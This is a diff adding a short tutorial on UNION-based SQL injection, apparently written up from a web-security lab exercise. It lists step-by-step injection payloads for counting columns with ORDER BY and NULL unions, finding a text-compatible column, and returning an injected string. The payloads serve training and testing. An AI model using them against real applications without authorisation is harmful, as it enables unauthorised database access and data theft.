@@ -1,0 +1,67 @@
+SQL Injection – UNION Attack Guide
+
+✅ Rule
+Steps to perform a UNION-based SQL Injection attack:
+
+📍 Step 1 – Determine the number of columns in the original query
+Two common methods:
+
+🔹 Method 1: ORDER BY Enumeration
+Incrementally increase the column index until you get an error.
+
+Example:
+' ORDER BY 1--       ✅ working
+' ORDER BY 2--       ✅ working
+' ORDER BY 3--       ✅ working
+' ORDER BY 4--       ❌ not working
+✅ Result: The original query has 3 columns.
+
+🔹 Method 2: UNION SELECT NULL Enumeration
+Gradually increase the number of NULL values until you get an error.
+
+Example:
+' UNION SELECT NULL--                     ✅ working
+' UNION SELECT NULL, NULL--               ✅ working
+' UNION SELECT NULL, NULL, NULL--         ✅ working
+' UNION SELECT NULL, NULL, NULL, NULL--   ❌ not working
+✅ Result: The original query has 3 columns.
+
+📍 Step 2 – Determine the data type of each column
+Inject strings ('a') in each column one by one to see which columns accept text.
+
+Examples:
+
+' UNION SELECT 'a', NULL, NULL--          ❌ not working
+' UNION SELECT NULL, 'a', NULL--          ✅ working
+' UNION SELECT NULL, NULL, 'a'--          ❌ not working
+✅ Result:
+
+Column 1: NOT TEXT
+
+Column 2: TEXT
+
+Column 3: NOT TEXT
+
+📍 Step 3 – Create a UNION SELECT statement with matching columns and data types
+Use the correct number of columns and put your injected data in the text-compatible column.
+
+Final payload example:
+' UNION SELECT NULL, '4ITLSd', NULL--
+✅ Result: Success – The injected string 4ITLSd appears in the response.
+
+🏁 End Goal
+Perform a UNION-based SQL injection that:
+
+Returns an additional row containing your chosen value.
+
+Confirms you can inject data into the response.
+
+✅ Your test was successful.
+This means you:
+
+Discovered the correct column count.
+
+Identified the column accepting text.
+
+Built a valid payload.
+
